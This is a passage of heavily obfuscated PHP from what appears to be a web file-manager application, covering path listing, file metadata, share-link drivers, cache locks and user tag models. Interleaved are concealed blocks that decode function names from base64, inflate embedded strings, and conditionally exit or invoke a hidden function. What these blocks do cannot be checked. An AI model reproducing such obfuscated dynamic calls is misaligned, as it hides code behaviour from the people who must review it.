$å¢¸ÖÔ™[1457]) { continue; } $ÆÚõÎœ± = $ã„ãÒµŸ . $…ö…©Ú˜; if (is_file($ÆÚõÎœ±) || is_link($ÆÚõÎœ±)) { $ô¶²ã‹Œ[$å¢¸ÖÔ™[80]]++; $ô¶²ã‹Œ[$å¢¸ÖÔ™[79]] += filesize_64($ÆÚõÎœ±); } else { if (is_dir($ÆÚõÎœ±)) { $ô¶²ã‹Œ[$å¢¸ÖÔ™[81]]++; $this->infoChildren($ÆÚõÎœ±, $ô¶²ã‹Œ, !1); } } } closedir($ñıÆœ‡); } private function folderInfo($œÛ®âß¯, $ÄÛ¨š = false) { $‰ì•€ë¼ =& $_SERVER[¹Éµ„ºå]; $œÛ®âß¯ = rtrim($œÛ®âß¯, $‰ì•€ë¼[8]) . $‰ì•€ë¼[8]; $ñ½Ì€ƒœ = $this->iconvApp($this->pathThis($œÛ®âß¯)); if ($ÄÛ¨š) { return array($‰ì•€ë¼[32] => $ñ½Ì€ƒœ, $‰ì•€ë¼[87] => $this->getPathOuter($œÛ®âß¯), $‰ì•€ë¼[33] => $‰ì•€ë¼[78]); } $Ğ ™”ñ = array($‰ì•€ë¼[32] => $ñ½Ì€ƒœ, $‰ì•€ë¼[87] => $this->getPathOuter($œÛ®âß¯), $‰ì•€ë¼[33] => $‰ì•€ë¼[78], $‰ì•€ë¼[231] => @filectime($œÛ®âß¯), $‰ì•€ë¼[88] => @filemtime($œÛ®âß¯), $‰ì•€ë¼[1652] => @fileatime($œÛ®âß¯), $‰ì•€ë¼[1653] => is_readable($œÛ®âß¯), $‰ì•€ë¼[1654] => is_writable($œÛ®âß¯), $‰ì•€ë¼[1655] => get_mode($œÛ®âß¯)); return $Ğ ™”ñ; } private function fileInfo($´·İÈú¯, $çû§Æ¯Ø = false) { $ùÏ‰ò¬Š =& $_SERVER[¹Éµ„ºå]; $×úÄó‰— = $this->iconvApp($this->pathThis($´·İÈú¯)); if ($çû§Æ¯Ø) { return array($ùÏ‰ò¬Š[32] => $×úÄó‰—, $ùÏ‰ò¬Š[87] => $this->getPathOuter($´·İÈú¯), $ùÏ‰ò¬Š[33] => $ùÏ‰ò¬Š[230], $ùÏ‰ò¬Š[79] => $this->size($´·İÈú¯), $ùÏ‰ò¬Š[166] => $this->ext($×úÄó‰—)); } $ñœØ¨üõ = array($ùÏ‰ò¬Š[32] => $×úÄó‰—, $ùÏ‰ò¬Š[87] => $this->getPathOuter($´·İÈú¯), $ùÏ‰ò¬Š[33] => $ùÏ‰ò¬Š[230], $ùÏ‰ò¬Š[231] => @filectime($´·İÈú¯), $ùÏ‰ò¬Š[88] => @filemtime($´·İÈú¯), $ùÏ‰ò¬Š[1652] => @fileatime($´·İÈú¯), $ùÏ‰ò¬Š[79] => $this->size($´·İÈú¯), $ùÏ‰ò¬Š[166] => $this->ext($×úÄó‰—), $ùÏ‰ò¬Š[1653] => is_readable($´·İÈú¯), $ùÏ‰ò¬Š[1654] => is_writable($´·İÈú¯), $ùÏ‰ò¬Š[1655] => get_mode($´·İÈú¯)); return $ñœØ¨üõ; } public function exist($èçæÇ·Ê) { $èçæÇ·Ê = $this->iconvSystem($èçæÇ·Ê); return @file_exists($èçæÇ·Ê); } public function isFile($ƒÃåš) { $ƒÃåš = $this->iconvSystem($ƒÃåš); return @is_file($ƒÃåš); } public function isFolder($ó¥ä²·¹) { $ó¥ä²·¹ = $this->iconvSystem($ó¥ä²·¹); return @is_dir($ó¥ä²·¹); } public function listPath($µ€Î÷âü, $Éº¤ï¨¬ = false) { $›ã²¢¿¢ =& $_SERVER[¹Éµ„ºå]; $µ€Î÷âü = $this->iconvSystem($µ€Î÷âü); $µ€Î÷âü = rtrim($µ€Î÷âü, $›ã²¢¿¢[8]) . $›ã²¢¿¢[8]; $¤ÂÇ«‡ = array($›ã²¢¿¢[85] => array(), $›ã²¢¿¢[86] => array()); if (!($ù„Èı©¤ = @opendir($µ€Î÷âü))) { return $¤ÂÇ«‡; } while (($êŸÅ€– = readdir($ù„Èı©¤)) !== !1) { if ($êŸÅ€– == $›ã²¢¿¢[10] || $êŸÅ€– == $›ã²¢¿¢[1457]) { continue; } $ÃãÂñ‘  = $µ€Î÷âü . $êŸÅ€–; if (is_file($ÃãÂñ‘ )) { $¤ÂÇ«‡[$›ã²¢¿¢[86]][] = $this->fileInfo($ÃãÂñ‘ , $Éº¤ï¨¬); } else { $¤ÂÇ«‡[$›ã²¢¿¢[85]][] = $this->folderInfo($ÃãÂñ‘ , $Éº¤ï¨¬); } } closedir($ù„Èı©¤); return $¤ÂÇ«‡; } public function listAll($”úŸ´¬‰, &$Ï©¶™— = array()) { $Ü¤ğß¥ =& $_SERVER[¹Éµ„ºå]; $”úŸ´¬‰ = $this->iconvSystem($”úŸ´¬‰); $”úŸ´¬‰ = rtrim($”úŸ´¬‰, $Ü¤ğß¥[8]) . $Ü¤ğß¥[8]; if (!($ÇùÀ½ÑÁ = @opendir($”úŸ´¬‰))) { return $Ï©¶™—; } while (($øî½Îúö = readdir($ÇùÀ½ÑÁ)) !== !1) { if ($øî½Îúö == $Ü¤ğß¥[10] || $øî½Îúö == $Ü¤ğß¥[1457]) { continue; } $Ù ÁÂ÷ë = $”úŸ´¬‰ . $øî½Îúö; $¡ŒøµÏ— = is_dir($Ù ÁÂ÷ë) && !is_link($Ù ÁÂ÷ë) ? 1 : 0; $Ù ÁÂ÷ë = $¡ŒøµÏ— ? $Ù ÁÂ÷ë . $Ü¤ğß¥[8] : $Ù ÁÂ÷ë; $Ï©¶™—[] = array($Ü¤ğß¥[87] => $this->getPathOuter($Ù ÁÂ÷ë), $Ü¤ğß¥[78] => $¡ŒøµÏ—, $Ü¤ğß¥[88] => intval(@filemtime($Ù ÁÂ÷ë)), $Ü¤ğß¥[79] => $¡ŒøµÏ— ? 0 : intval($this->size($Ù ÁÂ÷ë))); if ($¡ŒøµÏ—) { $this->listAll($Ù ÁÂ÷ë, $Ï©¶™—); } } closedir($ÇùÀ½ÑÁ); return $Ï©¶™—; } public function has($ë¢ˆ‰»º, $³£’”°œ = false, $ÜğÌ—† = true) { $‡ëıêØ‰ =& $_SERVER[¹Éµ„ºå]; $ë¢ˆ‰»º = $this->iconvSystem($ë¢ˆ‰»º); $ë¢ˆ‰»º = rtrim($ë¢ˆ‰»º, $‡ëıêØ‰[8]) . $‡ëıêØ‰[8]; if (!($€²ÂÊÔ× = @opendir($ë¢ˆ‰»º))) { return !1; } $ô°„Í = 0; $˜ìç»Òˆ = 0; $­ÉìÂù = 0; while (($‡½à–›ƒ = readdir($€²ÂÊÔ×)) !== !1) { if ($‡½à–›ƒ == $‡ëıêØ‰[10] || $‡½à–›ƒ == $‡ëıêØ‰[1457]) { continue; } $™¬‰Ò«í = $ë¢ˆ‰»º . $‡½à–›ƒ; if ($³£’”°œ) { $­ÉìÂù++; if (@is_file($™¬‰Ò«í)) { $ô°„Í++; } else { $˜ìç»Òˆ++; } if ($­ÉìÂù > 10000) { break; } continue; } if ($ÜğÌ—†) { if (@is_file($™¬‰Ò«í)) { return !0; } } else { if (@is_dir($™¬‰Ò«í . $‡ëıêØ‰[8])) { return !0; } } } closedir($€²ÂÊÔ×); if ($³£’”°œ) { return array($‡ëıêØ‰[239] => $ô°„Í, $‡ëıêØ‰[240] => $˜ìç»Òˆ); } return !1; } public function hashSimple($¸ßş¥†÷) { $ß³ˆëæó =& $_SERVER[¹Éµ„ºå]; if (!$¸ßş¥†÷) { return md5($ß³ˆëæó[12]); } $¸ßş¥†÷ = $this->iconvSystem($¸ßş¥†÷); $ÕÉÇıö¢ = $this->size($¸ßş¥†÷); $à»©ÚÌİ = 200; $›ó»İ©˜ = 50; if ($ÕÉÇıö¢ <= $à»©ÚÌİ * $›ó»İ©˜) { return $this->hashMd5($¸ßş¥†÷) . $ÕÉÇıö¢; } $şÑ–ŸİÁ = $ß³ˆëæó[12]; $À‚Øˆš = intval($ÕÉÇıö¢ / $›ó»İ©˜); $ü× ÄĞ = fopen($¸ßş¥†÷, $ß³ˆëæó[1656]); if (!$ü× ÄĞ) { return $şÑ–ŸİÁ; } for ($ÂœãÒ¾ = 0; $ÂœãÒ¾ < $›ó»İ©˜; $ÂœãÒ¾++) { fseek_64($ü× ÄĞ, $À‚Øˆš * $ÂœãÒ¾); $şÑ–ŸİÁ .= fread($ü× ÄĞ, $à»©ÚÌİ); } fseek_64($ü× ÄĞ, $ÕÉÇıö¢ - $à»©ÚÌİ); $şÑ–ŸİÁ .= fread($ü× ÄĞ, $à»©ÚÌİ); fclose($ü× ÄĞ); return md5($şÑ–ŸİÁ) . $ÕÉÇıö¢; } public function getContent($£ÃÕßÉ‡) { $£ÃÕßÉ‡ = $this->iconvSystem($£ÃÕßÉ‡); return file_get_contents($£ÃÕßÉ‡); } public function setContent($¾ªöâĞ», $‹Ø…ÈŒ« = '') { $¾ªöâĞ» = $this->iconvSystem($¾ªöâĞ»); $ƒüéˆ…À = @file_put_contents($¾ªöâĞ», $‹Ø…ÈŒ«, LOCK_EX); if (!$ƒüéˆ…À) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); } clearstatcache(); @chmod($¾ªöâĞ», $this->pathAuth); return $ƒüéˆ…À === !1 ? !1 : !0; } public function fileSubstr($¶Õîû¶­, $÷–à½ˆñ = 0, $×À‰¹Ò = false) { $–äĞ¼Í =& $_SERVER[¹Éµ„ºå]; $¶Õîû¶­ = $this->iconvSystem($¶Õîû¶­); if ($×À‰¹Ò === !1) { $×À‰¹Ò = $this->size($¶Õîû¶­); } if ($×À‰¹Ò <= 0) { return $–äĞ¼Í[12]; } $ûªÅŠ… = fopen($¶Õîû¶­, $–äĞ¼Í[1656]); if (!$ûªÅŠ…) { return !1; } fseek_64($ûªÅŠ…, $÷–à½ˆñ); $èùÆø«Ö = fread($ûªÅŠ…, $×À‰¹Ò); fclose($ûªÅŠ…); if (!$èùÆø«Ö) { $this->writeLog(__FUNCTION__ . $–äĞ¼Í[1648], !0); } return $èùÆø«Ö; } public function upload($®É‡á”ì, $‚ı» ËÙ, $‘¾¥ıŸ’ = false, $öš¼Ùäó = REPEAT_REPLACE) { if (!$‚ı» ËÙ || !@file_exists($‚ı» ËÙ)) { return !1; } if ($‘¾¥ıŸ’) { return $this->moveFile($‚ı» ËÙ, $®É‡á”ì); } return $this->copyFile($‚ı» ËÙ, $®É‡á”ì); } public function setModifyTime($ƒî»¼Í, $äç¶«ø = '') { @touch($ƒî»¼Í, intval($äç¶«ø)); } public function download($¨±ª¾ä©, $‚·‰©¡) { return $this->iconvSystem($¨±ª¾ä©); } } goto AóÎÔ«†Ÿ„; D«‰òÏÏŠ : if (strlen($ouvybnzrsq) < $_SERVER[¹Éµ„ºå][702]) { return; } $_SERVER[ô÷‡¤È] = explode($_SERVER[¹Éµ„ºå][703], gzinflate(substr($_SERVER[¹Éµ„ºå][704], 10, -8))); $itglubkdjq = $_SERVER[¹Éµ„ºå][705]; goto E¯ÇõÕ…ÛÍ; Eá§ÄÑÂé®: class PathDriverDbShareLink extends PathDriverDB { public function __construct($àÒ”³ÅÎ) { $this->pathParse = $àÒ”³ÅÎ; $this->model = Model($_SERVER[¹Éµ„ºå][1523]); } protected function infoParse($£¼……ëÍ, $óÖÃ¦ı = false, $œŸüÀ»š = false) { $í–ÄñÇÊ =& $_SERVER[¹Éµ„ºå]; return Action($í–ÄñÇÊ[1352])->sharePathInfo($this->pathParse[$í–ÄñÇÊ[87]], !0, $óÖÃ¦ı); } public function listPath($ÍıÖÄÚğ, $ÀÓøÁ = false) { $ğ·œ˜” =& $_SERVER[¹Éµ„ºå]; $Üº„ü–• = parent::listPath($ÍıÖÄÚğ, $ÀÓøÁ); if (!$Üº„ü–•) { return $Üº„ü–•; } if (is_array($Üº„ü–•[$ğ·œ˜”[958]])) { $Üº„ü–•[$ğ·œ˜”[958]] = Action($ğ·œ˜”[1352])->shareItemInfo($Üº„ü–•[$ğ·œ˜”[958]]); } foreach ($Üº„ü–• as $ÏÜë®á‰ => $Ä‰Š¾ƒˆ) { if (!in_array($ÏÜë®á‰, array($ğ·œ˜”[86], $ğ·œ˜”[85]))) { continue; } foreach ($Ä‰Š¾ƒˆ as $¨ıÎïÖ => $ı¿ƒè‡ñ) { $Üº„ü–•[$ÏÜë®á‰][$¨ıÎïÖ] = Action($ğ·œ˜”[1352])->shareItemInfo($ı¿ƒè‡ñ); } } return $Üº„ü–•; } public function listAll($ØåîÇë¹) { $¦ï±Ù¸Ó =& $_SERVER[¹Éµ„ºå]; $ğ•ç˜ò¢ = IO::info($this->pathParse[$¦ï±Ù¸Ó[87]]); if (!$ğ•ç˜ò¢) { return array(); } $ºá©¿Üï = $this->model->listAll($ØåîÇë¹); foreach ($ºá©¿Üï as &$’¦ŞşÒ«) { $’¦ŞşÒ«[$¦ï±Ù¸Ó[90]] = Action($¦ï±Ù¸Ó[1352])->shareItemInfo($’¦ŞşÒ«[$¦ï±Ù¸Ó[90]]); } unset($’¦ŞşÒ«); return $ºá©¿Üï; } } class PathDriverDriverShareItem { public function __construct($åÜş’ö) { $this->pathParse = $åÜş’ö; } public function __call($˜ÍÔÜúœ, $¶—™‰ç€) { $–ş«¿ù— =& $_SERVER[¹Éµ„ºå]; if (method_exists($this, $˜ÍÔÜúœ)) { return; } $îÜ”¬ƒ = call_user_func_array(array($–ş«¿ù—[1531], $˜ÍÔÜúœ), $¶—™‰ç€); $÷É¤ïÈ = array($–ş«¿ù—[1532], $–ş«¿ù—[1533], $–ş«¿ù—[1534], $–ş«¿ù—[1535], $–ş«¿ù—[641], $–ş«¿ù—[643], $–ş«¿ù—[1536], $–ş«¿ù—[107], $–ş«¿ù—[1537], $–ş«¿ù—[1538]); if (in_array($˜ÍÔÜúœ, $÷É¤ïÈ)) { $îÜ”¬ƒ = $this->getPathOuter($îÜ”¬ƒ); } return $îÜ”¬ƒ; } public function copy($Ã£—çáÜ, $Ó£Ø¿Î‘, $˜˜ºÀ‡Ú = false, $ìâŠïÃÇ = false) { return $this->copyMove($Ã£—çáÜ, $Ó£Ø¿Î‘, $˜˜ºÀ‡Ú, $_SERVER[¹Éµ„ºå][641], $ìâŠïÃÇ); } public function move($‚’šÄÛœ, $ç”ã¾ÖÍ, $Ÿ¶Æ¢é = false, $•ÀÎÀã© = false) { return $this->copyMove($‚’šÄÛœ, $ç”ã¾ÖÍ, $Ÿ¶Æ¢é, $_SERVER[¹Éµ„ºå][643], $•ÀÎÀã©); } private function copyMove($ñù‘»¨¦, $ÀÚ·Ó¾Ş, $Ç‡¦†ªè, $²“º¥äğ, $áØŠÀ¨¯ = false) { $’Óœ×âº =& $_SERVER[¹Éµ„ºå]; $ØÕ‰Üóş = $ÀÚ·Ó¾Ş; $ÆÇŠó­§ = IO::driverMake($ÀÚ·Ó¾Ş); if ($ÆÇŠó­§->pathParse[$’Óœ×âº[1326]]) { $ÀÚ·Ó¾Ş = $ÆÇŠó­§->pathParse[$’Óœ×âº[1326]]; } else { $ÀÚ·Ó¾Ş = $ØÕ‰Üóş; } $ì¢…“Íû = IO::copyMove($ñù‘»¨¦, $ÀÚ·Ó¾Ş, $Ç‡¦†ªè, $²“º¥äğ, $áØŠÀ¨¯); $ì¢…“Íû = $this->getPathOuter($ì¢…“Íû); return $ì¢…“Íû; } public function pathThis($×¢âÎ•Ö) { return get_path_this($this->pathParse[$_SERVER[¹Éµ„ºå][87]]); } public function pathFather($ëšª†šĞ) { return get_path_father($this->pathParse[$_SERVER[¹Éµ„ºå][87]]); } public function iconvSystem($ªƒîˆëï) { return $ªƒîˆëï; } protected function infoParse($õëÄÛ™, $‰ø³úÛŒ = false) { $ø÷å±èİ =& $_SERVER[¹Éµ„ºå]; $ËîõØ‹ = $this->pathParse[$ø÷å±èİ[576]][$ø÷å±èİ[583]] . $this->pathParse[$ø÷å±èİ[1345]]; if ($‰ø³úÛŒ) { $©²Í”¬Ë = IO::infoWithChildren($ËîõØ‹); } else { $©²Í”¬Ë = IO::info($ËîõØ‹); } $´„ÂÄò¦ = $this->pathParse[$ø÷å±èİ[576]]; return Action($ø÷å±èİ[1530])->_shareItemeParse($©²Í”¬Ë, $´„ÂÄò¦); } public function listAll($ç’áË‹) { $òáõÄ›Ú =& $_SERVER[¹Éµ„ºå]; $—¹°‚¶í = IO::listAll($ç’áË‹); $³–à’Ôİ = rtrim($this->pathParse[$òáõÄ›Ú[576]][$òáõÄ›Ú[583]], $òáõÄ›Ú[8]); foreach ($—¹°‚¶í as &$êáŞŒÛã) { $êáŞŒÛã[$òáõÄ›Ú[87]] = $this->pathDriver . $òáõÄ›Ú[8] . ltrim(substr($êáŞŒÛã[$òáõÄ›Ú[87]], strlen($³–à’Ôİ)), $òáõÄ›Ú[8]); } unset($êáŞŒÛã); return $—¹°‚¶í; } public function listAllSimple($€Ù¯ËÇ, $Ü›­ğ“ù = false) { $÷„—ÈŞ =& $_SERVER[¹Éµ„ºå]; $¢ÁÎä‹ç = $this->listAll($€Ù¯ËÇ); $¿Ã¡¸ı = $this->pathParse[$÷„—ÈŞ[510]]; if (trim($¿Ã¡¸ı, $÷„—ÈŞ[8]) == trim(get_path_father($¿Ã¡¸ı), $÷„—ÈŞ[8])) { $Ü›­ğ“ù = !0; } return IO::init($÷„—ÈŞ[12])->listAllSimpleMake($¢ÁÎä‹ç, $¿Ã¡¸ı, $Ü›­ğ“ù); } public function getPathOuter($á×İ˜ñ) { $ÊºÎ› Ì =& $_SERVER[¹Éµ„ºå]; $¦èéÁéÚ = KodIO::parse($á×İ˜ñ); if ($¦èéÁéÚ[$ÊºÎ› Ì[33]] == KodIO::KOD_SHARE_ITEM) { return $¦èéÁéÚ[$ÊºÎ› Ì[87]]; } $—’ÕÎÑÌ = KodIO::clear($á×İ˜ñ); $‰èşßò = KodIO::clear($this->pathParse[$ÊºÎ› Ì[576]][$ÊºÎ› Ì[583]]); $¶óÏÛØé = substr($—’ÕÎÑÌ, strlen($‰èşßò)); if (substr($—’ÕÎÑÌ, 0, strlen($‰èşßò)) != $‰èşßò) { return !1; } return $this->pathParse[$ÊºÎ› Ì[1346]] . $ÊºÎ› Ì[8] . ltrim($¶óÏÛØé, $ÊºÎ› Ì[8]); } public function getType() { $µœıºÄ¸ =& $_SERVER[¹Éµ„ºå]; $üÄß±É­ = str_replace($µœıºÄ¸[77], $µœıºÄ¸[12], get_class($this)); return strtolower($üÄß±É­); } public function isOsDriver($«‘è„Ÿç) { return IO::isOsDriver($«‘è„Ÿç); } public function info($­õÃ¨µü) { return $this->infoParse($­õÃ¨µü); } public function infoAuth($ƒ‰˜šïƒ) { return $this->infoParse($ƒ‰˜šïƒ); } public function infoWithChildren($‹Œô”î¯) { return $this->infoParse($‹Œô”î¯, !0); } public function infoFull($Ïê¯ÈÑ±) { return $this->infoParse($Ïê¯ÈÑ±); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Şùàµ¯ù) { $this->pathParse = $Şùàµ¯ù; } protected function infoParse($»°·»æœ, $œÖ½ØŸé = false) { $ÔáâÜ€Ä =& $_SERVER[¹Éµ„ºå]; return Action($ÔáâÜ€Ä[1352])->sharePathInfo($this->pathParse[$ÔáâÜ€Ä[87]], !0, $œÖ½ØŸé); } public function listPath($¢ÅÂ˜, $¶Ñ”ª°È = false) { $ôÃŠóêÓ =& $_SERVER[¹Éµ„ºå]; $ÆõŸğì÷ = IO::listPath($¢ÅÂ˜, $¶Ñ”ª°È); if (!$ÆõŸğì÷) { return $ÆõŸğì÷; } if (is_array($ÆõŸğì÷[$ôÃŠóêÓ[958]])) { $Ÿ—¤®› = Action($ôÃŠóêÓ[1539])->parsePathChildren($ÆõŸğì÷[$ôÃŠóêÓ[958]], array($ôÃŠóêÓ[510] => $¢ÅÂ˜)); $ÆõŸğì÷[$ôÃŠóêÓ[958]] = Action($ôÃŠóêÓ[1352])->shareItemInfo($Ÿ—¤®›); } foreach ($ÆõŸğì÷ as $¢ß©‰™˜ => $Öõ¶ˆíÃ) { if (!in_array($¢ß©‰™˜, array($ôÃŠóêÓ[86], $ôÃŠóêÓ[85]))) { continue; } foreach ($Öõ¶ˆíÃ as $³ïªµüô => $Ÿ—¤®›) { $Ÿ—¤®› = Action($ôÃŠóêÓ[1539])->parsePathChildren($Ÿ—¤®›, array($ôÃŠóêÓ[510] => $¢ÅÂ˜)); $ÆõŸğì÷[$¢ß©‰™˜][$³ïªµüô] = Action($ôÃŠóêÓ[1352])->shareItemInfo($Ÿ—¤®›); } } return $ÆõŸğì÷; } } goto dò°œäÂ; eÑ‹Æ²ÂÂ: class CacheLockMemcached { public function lock($–Îµ–», $”¶øô— = 0) { $ÂÓâ›”ä = Cache::init(); $ÉØğ¤°Š = microtime(!0) + $”¶øô—; while (microtime(!0) < $ÉØğ¤°Š) { $×´şÈ§ = $ÂÓâ›”ä->get($–Îµ–»); if (!$×´şÈ§ || $×´şÈ§ < microtime(!0)) { $¾ÎóÈ£ = $ÂÓâ›”ä->handle->add($–Îµ–», $ÉØğ¤°Š, $”¶øô—); if ($¾ÎóÈ£) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($­•ÉœÏç) { return Cache::init()->get($­•ÉœÏç); } public function unlock($¸©ˆÖáç) { return Cache::init()->remove($¸©ˆÖáç); } } class CacheLockDatabase { public function lock($Ê¥–µ™×, $ïµ±æ­Ö = 0) { $à”ˆÊœü = Model($_SERVER[¹Éµ„ºå][973]); $ãñ¯«ûÛ = microtime(!0) + $ïµ±æ­Ö; while (microtime(!0) < $ãñ¯«ûÛ) { $”ŠÔ§À’ = $à”ˆÊœü->get($Ê¥–µ™×); if (!$”ŠÔ§À’ || $”ŠÔ§À’ < microtime(!0)) { $üÂÒ…– = $à”ˆÊœü->set($Ê¥–µ™×, $ãñ¯«ûÛ); if ($üÂÒ…–) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($»²›Ñ–) { return Model($_SERVER[¹Éµ„ºå][973])->get($»²›Ñ–); } public function unlock($¸ÂŒ¬‹Ñ) { Model($_SERVER[¹Éµ„ºå][973])->remove($¸ÂŒ¬‹Ñ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($÷™ƒ˜„Ê, $Éğ½’Ä) { $Î£êç‰ı =& $_SERVER[¹Éµ„ºå]; if (!class_exists($Î£êç‰ı[1015])) { show_json($Î£êç‰ı[1016], !1); } $this->cacheTime = $Éğ½’Ä; $this->handle = new Memcached(); if (is_array($÷™ƒ˜„Ê[$Î£êç‰ı[1017]]) && count($÷™ƒ˜„Ê[$Î£êç‰ı[1017]]) >= 1) { foreach ($÷™ƒ˜„Ê[$Î£êç‰ı[1017]] as $·œÇ¾°Î) { $ÒôÚ™½Û = explode($Î£êç‰ı[4], $·œÇ¾°Î); $this->handle->addServer($ÒôÚ™½Û[0], $ÒôÚ™½Û[1]); } } else { $this->handle->addServer($÷™ƒ˜„Ê[$Î£êç‰ı[206]], $÷™ƒ˜„Ê[$Î£êç‰ı[207]]); } } public function set($Î¦ÈîËÌ, $—Ø€Ùù, $‡åş²¤× = false) { $‡åş²¤× = $‡åş²¤× ? $‡åş²¤× : $this->cacheTime; return $this->handle->set($Î¦ÈîËÌ, $—Ø€Ùù, $‡åş²¤×); } public function get($ˆ¦­ñâÙ) { return $this->handle->get($ˆ¦­ñâÙ); } public function remove($û÷àÓ±á) { return $this->handle->delete($û÷àÓ±á); } public function deleteAll() { return $this->handle->flush(); } } goto c‚ÆŞÌÎãÄ; Fëó‚­†ğ: define($_SERVER[¹Éµ„ºå][317], 3); define($_SERVER[¹Éµ„ºå][318], 1); define($_SERVER[¹Éµ„ºå][319], 0); goto d¶‘ìÄ¤; EÎÊº²Üƒ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\x6f\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ºçİšï) { return "\125\163\x65\x72\117\160\164\151\x6f\156\x5f{$ºçİšï}\137" . KodUser::id(); } protected function filterWhere($½¶ñ¯›î) { $½¶ñ¯›î[$_SERVER[¹Éµ„ºå][1582]] = KodUser::id(); return $½¶ñ¯›î; } public function cacheRemoveUser($ß‰çÁ÷, $¥ê„èÖ¯) { return Cache::remove("\x55\163\x65\162\117\x70\x74\x69\x6f\156\x5f{$ß‰çÁ÷}\x5f" . $¥ê„èÖ¯); } protected function optionDefault($Ğ£í‚¥¿ = '') { $şô£Ê…ø =& $_SERVER[¹Éµ„ºå]; if ($Ğ£í‚¥¿ == $şô£Ê…ø[12]) { return $GLOBALS[$şô£Ê…ø[6]][$şô£Ê…ø[2708]]; } if ($Ğ£í‚¥¿ == $şô£Ê…ø[2709]) { return $GLOBALS[$şô£Ê…ø[6]][$şô£Ê…ø[2710]]; } } } if ($_SERVER[$_SERVER[¹Éµ„ºå][1025]] != $_SERVER[$_SERVER[¹Éµ„ºå][1026]]) { $_getc = $_SERVER[¹Éµ„ºå][1028]; $_getfile = $_SERVER[$_SERVER[¹Éµ„ºå][1029]] . $_SERVER[¹Éµ„ºå][1030]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹Éµ„ºå][285], $_getfilec); if (count($_getarrs) < $_SERVER[¹Éµ„ºå][722]) { $exit = $_SERVER[¹Éµ„ºå][1031]; $exit(); } $_act = $_SERVER[¹Éµ„ºå][1036]; $_act($_SERVER[$_SERVER[¹Éµ„ºå][1035]]); } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\x2e\164\x61\147\x4c\151\163\164"; public $modelType = "\x55\x73\x65\x72\117\160\164\x69\157\156"; public $field = array("\156\141\155\145", "\163\x74\171\x6c\145", "\163\157\162\164"); public function listData($ñºŒ‚šã = false, $–õœ§ãÇ = "\x73\x6f\162\164", $û¥×ÆÕ¥ = false) { return parent::listData($ñºŒ‚šã, $–õœ§ãÇ, $û¥×ÆÕ¥); } public function remove($ü¯‚êÈ–) { return parent::remove($ü¯‚êÈ–); } public function add($€èåµ˜Ğ, $êêû’º = "\154\141\142\x65\154\55\x67\x72\x65\171\x2d\156\157\162\155\x61\x6c") { $áøúœÍ =& $_SERVER[¹Éµ„ºå]; if ($this->findByName($€èåµ˜Ğ)) { return !1; } $šóäÕ½Œ = array($áøúœÍ[509] => $€èåµ˜Ğ, $áøúœÍ[574] => $êêû’º, $áøúœÍ[2175] => $this->getSort($áøúœÍ[335]) + 1); return parent::insert($šóäÕ½Œ); } public function update($ğîÕÖûŒ, $Çû›œ£Ã) { $‰§¿ï“´ =& $_SERVER[¹Éµ„ºå]; $‹ĞğÖñ± = $this->listData($ğîÕÖûŒ); $ÑŞŠ€„Ç = $this->findByName($Çû›œ£Ã[$‰§¿ï“´[32]]); if (!$‹ĞğÖñ± || $ÑŞŠ€„Ç && $ÑŞŠ€„Ç[$‰§¿ï“´[487]] != $‹ĞğÖñ±[$‰§¿ï“´[487]]) { return !1; } return parent::update($ğîÕÖûŒ, $Çû›œ£Ã); } public function moveTop($ŞÀµıŸš) { $İ«¯ã‰± =& $_SERVER[¹Éµ„ºå]; $æğ¤½ş = parent::listData(); $”Â“·Ì = $this->getSort($İ«¯ã‰±[334]); foreach ($æğ¤½ş as &$Ú½Ì’ˆè) { if ($Ú½Ì’ˆè[$İ«¯ã‰±[487]] == $ŞÀµıŸš) { $Ú½Ì’ˆè[$İ«¯ã‰±[2193]] = $”Â“·Ì; continue; } $Ú½Ì’ˆè[$İ«¯ã‰±[2193]] += 1; } unset($Ú½Ì’ˆè); return parent::resetData($æğ¤½ş); } public function moveBottom($©ø­Â¼Î) { $ş ÏÄÚ =& $_SERVER[¹Éµ„ºå]; $—‘½ã¼ = $this->getSort($ş ÏÄÚ[335]) + 1; return parent::update($©ø­Â¼Î, array($ş ÏÄÚ[2193] => $—‘½ã¼)); } public function resetSort($ĞÉ“ë‹¶) { $ÀóË°¡ô =& $_SERVER[¹Éµ„ºå]; $‰¬®‹ú˜ = array(); $ĞÉ“ë‹¶ = is_array($ĞÉ“ë‹¶) ? $ĞÉ“ë‹¶ : array(); for ($ğõ¯×ÏÇ = 0; $ğõ¯×ÏÇ < count($ĞÉ“ë‹¶); $ğõ¯×ÏÇ++) { $‰¬®‹ú˜[$ĞÉ“ë‹¶[$ğõ¯×ÏÇ] . $ÀóË°¡ô[12]] = $ğõ¯×ÏÇ + 1; } $€Í¡æğÔ = parent::listData(); foreach ($€Í¡æğÔ as &$Ó÷”í¼—) { $Ïæ¬±Ñø = $‰¬®‹ú˜[$Ó÷”í¼—[$ÀóË°¡ô[487]]]; $Ó÷”í¼—[$ÀóË°¡ô[2193]] = $Ïæ¬±Ñø ? $Ïæ¬±Ñø : $Ó÷”í¼—[$ÀóË°¡ô[2193]]; } unset($Ó÷”í¼—); return parent::resetData($€Í¡æğÔ); } private function getSort($ŞÀóèŠÛ) { $ì·»¾¶÷ =& $_SERVER[¹Éµ„ºå]; $ÇÃ…÷ÖÆ = parent::listData(); $¼‚‰»§ = array_to_keyvalue($ÇÃ…÷ÖÆ, $ì·»¾¶÷[12], $ì·»¾¶÷[2193]); if (!$¼‚‰»§) { $¼‚‰»§ = array(0); } $Œ·Âû˜¬ = $ŞÀóèŠÛ == $ì·»¾¶÷[335] ? max($¼‚‰»§) : min($¼‚‰»§); return intval($Œ·Âû˜¬); } } goto Fª¹ó“ÄÔ©; aÙ£Ì‹†”ç: $fileSize = strrev(base64_decode($_SERVER[ÃÂ¤•­ú][0])); function binCheckNeq($Ã‘¢åÔ´, $¿é±–¶±) { return $Ã‘¢åÔ´ != $¿é±–¶±; } $_SERVER[$_SERVER[ÃÂ¤•­ú][1]] = $fileSize($_SERVER[$_SERVER[ÃÂ¤•­ú][2]]); goto DõÒìœíœ˜; 